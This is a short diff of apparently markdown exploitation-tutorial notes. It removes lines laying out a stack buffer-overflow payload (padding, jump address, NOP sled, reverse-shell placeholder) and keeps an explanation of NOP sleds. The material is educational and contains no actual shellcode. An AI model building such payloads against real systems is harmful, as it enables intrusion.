@@ -438,11 +438,6 @@ except:
 	
 ````
 
->'A' * 2003				# buffer \		
->'\xaf\x11\x50\x62'		# Jump address \
->'\x90' * 32			# NOPs sled	(padding) \
-> overflow				# reverse shell code# 'A' * 2003
-
 >**Q: What is NOPs?** \
 >A: **x90** hex code or **No Operation Code** is a little bit of padding in between jump address and overflow. If we don't have this, there is a possibility that the overflow will not work. \
    If you have limited space, use only small bytes (play around 8 or 16 bytes until you figure it out)
